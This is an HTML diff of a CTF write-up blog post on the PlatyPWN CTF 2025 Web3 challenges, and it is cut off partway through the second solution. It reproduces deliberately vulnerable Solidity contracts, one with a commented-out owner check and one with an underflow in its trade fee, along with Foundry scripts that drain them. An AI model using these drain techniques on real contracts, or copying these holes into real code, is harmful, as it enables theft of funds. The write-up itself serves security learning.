@@ -1,0 +1,1095 @@
+<!DOCTYPE html>
+<html lang="en-gb"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">d4r3-w0lf&#39;s blog</title>
+<meta property="og:title" content="d4r3-w0lf&#39;s blog" />
+<meta name="twitter:title" content="d4r3-w0lf&#39;s blog" />
+<meta itemprop="name" content="d4r3-w0lf&#39;s blog" />
+<meta name="application-name" content="d4r3-w0lf&#39;s blog" />
+<meta property="og:site_name" content="d4r3-w0lf&#39;s blog" />
+
+<meta name="description" content="A hybrid 36 hour-long intermediate Jeopardy Capture the Flag event!">
+<meta itemprop="description" content="A hybrid 36 hour-long intermediate Jeopardy Capture the Flag event!" />
+<meta property="og:description" content="A hybrid 36 hour-long intermediate Jeopardy Capture the Flag event!" />
+<meta name="twitter:description" content="A hybrid 36 hour-long intermediate Jeopardy Capture the Flag event!" />
+
+<meta property="og:locale" content="en-gb" />
+<meta name="language" content="en-gb" />
+
+  <link rel="alternate" hreflang="en-gb" href="http://localhost:1313/writeups/platypwn_ctf_2025/" title="English" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.152.2">
+
+    
+    <meta property="og:url" content="http://localhost:1313/writeups/platypwn_ctf_2025/">
+  <meta property="og:site_name" content="d4r3-w0lf&#39;s blog">
+  <meta property="og:title" content="PlatyPWN_CTF_2025">
+  <meta property="og:description" content="A hybrid 36 hour-long intermediate Jeopardy Capture the Flag event!">
+  <meta property="og:locale" content="en_gb">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2025-11-16T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-11-16T00:00:00+00:00">
+
+
+    
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="PlatyPWN_CTF_2025">
+  <meta name="twitter:description" content="A hybrid 36 hour-long intermediate Jeopardy Capture the Flag event!">
+
+
+    
+
+    <link rel="canonical" href="http://localhost:1313/writeups/platypwn_ctf_2025/">
+    <link href="/style.min.fd66b7ca726159bf63f94988bacb37589295244d875ae21d7775378fb7a161c2.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+    <link href="/css/custom-code.min.9a2d8d012ac1c779133d49f133f2102fe718e594b698ebeda36b3d3c5cce0d10.css" rel="stylesheet">
+    <script src="/js/code-copy.min.39843ae1ecce47d1771daff983989865a0c7c3d0ab5332777c83bb984ce283a5.js" defer></script>
+
+    
+    
+    
+        
+        
+        
+        
+        <link rel="apple-touch-icon" sizes="180x180" href="/avatar_hu_b4461e2406be35da.png">
+        <link rel="icon" type="image/png" sizes="32x32" href="/avatar_hu_51cda609a5e73197.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/avatar_hu_ba29a47d821e30be.png">
+        <link rel="icon" type="image/png" sizes="192x192" href="/avatar_hu_e7a53798ad83bb50.png">
+        <link rel="icon" type="image/png" sizes="512x512" href="/avatar_hu_776e4093a03fe024.png">
+        <link rel="shortcut icon" href="/avatar_hu_51cda609a5e73197.png">
+    
+
+
+
+
+<link rel="manifest" href="http://localhost:1313/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    
+</head>
+
+
+<body data-theme = "dark" class="notransition">
+
+<script src="/js/theme.js"></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        
+        </a>
+        
+        
+        <strong class="menu-link" style="opacity:1; color: rgb(91, 132, 244);">D4R3-W0LF's BLOG</strong>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">    
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/posts/">
+                        Posts
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/writeups/">
+                        Writeups
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/projects/">
+                        Projects
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/pages/about/">
+                        About
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">PlatyPWN_CTF_2025</h1>
+                
+                
+                
+                <div class="post-meta">
+                    <time datetime="2025-11-16T00:00:00&#43;00:00" itemprop="datePublished"> 16 Nov 2025 </time>
+                </div>
+                
+            </header>
+            
+            <div class="page-content">
+                <h1 style="color: rgba(35, 141, 239, 1);">Web3</h1>
+<h2 id="1-thanks-">1. Thanks :</h2>
+<h5 id="challenge-description-">Challenge Description :</h5>
+<p>Tighten your seatbelts and get ready to embark on an exhilarating journey through the world of blockchain technology! This intro challenge will help you get started.</p>
+<h5 id="setupsol">Setup.sol</h5>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;./Chal.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Setup</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Chal</span> <span class="k">public</span> <span class="k">immutable</span> <span class="n">TARGET</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">()</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">TARGET</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Chal</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span> <span class="o">==</span> <span class="mi">100</span> <span class="kc">ether</span><span class="p">,</span> <span class="s">&#34;Must send 100 ether&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="k">payable</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">TARGET</span><span class="p">)).</span><span class="nb">transfer</span><span class="p">(</span><span class="mi">100</span> <span class="kc">ether</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">isSolved</span><span class="p">()</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kt">address</span><span class="p">(</span><span class="n">TARGET</span><span class="p">).</span><span class="nb">balance</span> <span class="o">&lt;</span> <span class="mi">10</span> <span class="kc">ether</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h5 id="chalsol">Chal.sol</h5>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Chal</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">public</span> <span class="n">owner</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">owner</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">withdraw</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">amount</span><span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// require(msg.sender == owner, &#34;Not owner&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">payable</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="n">amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">getBalance</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h5 id="my-approach-">My Approach :</h5>
+<p>After looking at the given contract code,I got to know that I just need to drain the chall contract to get my flag.</p>
+<p>I simply called the <code>withdraw</code> function with the challenge contract’s entire balance as the input <code>amount</code>.</p>
+<p>That’s it.</p>
+<h5 id="thanksssol">Thanks.s.sol</h5>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: UNLICENSED
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">Script</span><span class="p">,</span> <span class="n">console</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;forge-std/Script.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kd">interface</span> <span class="nc">Ichal</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">getBalance</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">withdraw</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">amount</span><span class="p">)</span> <span class="k">external</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">interface</span> <span class="nc">ISetup</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">TARGET</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span><span class="p">(</span><span class="kt">address</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">ThanksScript</span> <span class="k">is</span> <span class="n">Script</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">Ichal</span> <span class="n">chal</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">chal</span> <span class="o">=</span> <span class="n">Ichal</span><span class="p">(</span><span class="n">ISetup</span><span class="p">(</span><span class="mh">0x03D059E7Cabe5EdD9e6EA44c3feded186e016F85</span><span class="p">).</span><span class="n">TARGET</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;challenge contract address&#34;</span><span class="p">,</span><span class="kt">address</span><span class="p">(</span><span class="n">chal</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">startBroadcast</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="nb">balance</span> <span class="o">=</span> <span class="n">chal</span><span class="p">.</span><span class="n">getBalance</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;Chal contract balance before: %e&#34;</span><span class="p">,</span><span class="nb">balance</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">chal</span><span class="p">.</span><span class="n">withdraw</span><span class="p">(</span><span class="nb">balance</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;Chal contract balance after: %e&#34;</span><span class="p">,</span><span class="n">chal</span><span class="p">.</span><span class="n">getBalance</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">stopBroadcast</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>After running this script successfully, I accessed the flag.</p>
+<p><strong>Flag is :</strong> <code>PP{g1v3_m3_y0ur_m0n3y::dURwDiaN-E4n}</code></p>
+<h2 id="2-unfair-trade-">2. Unfair Trade :</h2>
+<h5 id="challenge-description--1">Challenge Description :</h5>
+<p>You found this smart contract deployed on the Ethereum Blockchain.It looks unfair,or does it?</p>
+<h5 id="setupsol-1">Setup.sol</h5>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">7</span><span class="p">.</span><span class="mi">6</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;./Chal.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Setup</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Chal</span> <span class="k">public</span> <span class="n">TARGET</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">()</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// Create the challenge contract
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">TARGET</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Chal</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1">// Require 100 ether to be sent during deployment
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span> <span class="o">==</span> <span class="mi">100</span> <span class="kc">ether</span><span class="p">,</span> <span class="s">&#34;Must send 100 ether&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1">// Send all the ether to the challenge contract
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">payable</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">TARGET</span><span class="p">)).</span><span class="nb">transfer</span><span class="p">(</span><span class="mi">100</span> <span class="kc">ether</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">isSolved</span><span class="p">()</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// Challenge is solved if the TARGET contract has less than 50 ether
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">return</span> <span class="kt">address</span><span class="p">(</span><span class="n">TARGET</span><span class="p">).</span><span class="nb">balance</span> <span class="o">&lt;</span> <span class="mi">50</span> <span class="kc">ether</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h5 id="chalsol-1">Chal.sol</h5>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">7</span><span class="p">.</span><span class="mi">6</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Chal</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">public</span> <span class="n">owner</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">owner</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">// Accept ether
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">// Trade function
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">trade</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">amount</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">amount</span> <span class="o">&gt;=</span> <span class="mi">3</span> <span class="kc">ether</span><span class="p">,</span> <span class="s">&#34;You must trade at least 3 ETH&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">balanceBeforeDeposit</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span> <span class="o">-</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">fee</span> <span class="o">=</span> <span class="p">(</span><span class="n">amount</span> <span class="o">-</span> <span class="mi">3</span> <span class="kc">ether</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">balanceBeforeDeposit</span> <span class="o">/</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">)</span> <span class="o">*</span> <span class="mi">6</span> <span class="o">/</span> <span class="mi">1000</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">maximumReturn</span> <span class="o">=</span> <span class="mi">150</span> <span class="kc">ether</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">outputAmount</span> <span class="o">=</span> <span class="n">amount</span> <span class="o">*</span> <span class="mi">9</span> <span class="o">/</span> <span class="mi">10</span> <span class="o">-</span> <span class="n">fee</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">outputAmount</span> <span class="o">&gt;</span> <span class="n">maximumReturn</span><span class="p">)</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">            <span class="n">outputAmount</span> <span class="o">=</span> <span class="n">maximumReturn</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">payable</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="n">outputAmount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">// Get balance
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">getBalance</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h5 id="my-approach--1">My Approach :</h5>
+<p>The goal of this challenge is to reduce the contract’s balance to <strong>below 50 ETH</strong>.
+Challenge contract starts with <strong>100 ETH</strong> and player balance is also <strong>100 ETH</strong></p>
+<p>The only function that sends ETH back to the user is <code>trade()</code>, so I looked into trade function.</p>
+<p>How I exploited this contract so that its balance goes below 50 ETH.</p>
+<ol>
+<li>
+<p>The <code>trade</code> function can return <strong>up to 150 ETH</strong>, but only if the calculated <code>outputAmount</code> becomes larger than <code>maximumReturn</code>. In that case, it simply pays out the full 150 ETH.</p>
+</li>
+<li>
+<p>The key line in the code is:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="n">outputAmount</span> <span class="o">=</span> <span class="n">amount</span> <span class="o">*</span> <span class="mi">9</span> <span class="o">/</span> <span class="mi">10</span> <span class="o">-</span> <span class="n">fee</span><span class="p">;</span>
+</span></span></code></pre></div><p>If the <code>fee</code> becomes bigger than <code>amount * 9 / 10</code>, this will cause an <strong>integer underflow</strong> because the contract uses Solidity <strong>0.7.6</strong> (which does not automatically prevent underflow/overflow).</p>
+</li>
+<li>
+<p>The <code>fee</code> depends heavily on the contract’s balance before the trade:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="n">fee</span> <span class="o">=</span> <span class="p">(</span><span class="n">amount</span> <span class="o">-</span> <span class="mi">3</span> <span class="kc">ether</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">balanceBeforeDeposit</span> <span class="o">/</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">)</span> <span class="o">*</span> <span class="mi">6</span> <span class="o">/</span> <span class="mi">1000</span><span class="p">;</span>
+</span></span></code></pre></div><p>This means the <strong>higher the contract balance</strong>, the larger the fee will be.</p>
+</li>
+<li>
+<p>So to make the fee large, I simply plug and played with some values.</p>
+</li>
+<li>
+<p>Then I sent <strong>67 ETH</strong> directly to the contract.
+This increased its balance from 100 ETH to <strong>167 ETH</strong>.</p>
+</li>
+<li>
+<p>Then I called the <code>trade()</code> function with <strong>30 ETH</strong>.
+Because the balance was so high, the fee became huge and caused an underflow in the <code>outputAmount</code> calculation.
+This made the result <code>outputAmount</code> wrap up to a large positive integer, so the condition <code>outputAmount &gt; maximumReturn</code> is true and the contract paid me the full <strong>150 ETH</strong>.</p>
+</li>
+</ol>
+<h5 id="unfairtradessol">UnfairTrade.s.sol</h5>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: UNLICENSED
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">Script</span><span class="p">,</span> <span class="n">console</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;forge-std/Script.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">interface</span> <span class="nc">Ichal</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">getBalance</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">trade</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kd">interface</span> <span class="nc">ISetup</span> <span class="p">{</span>
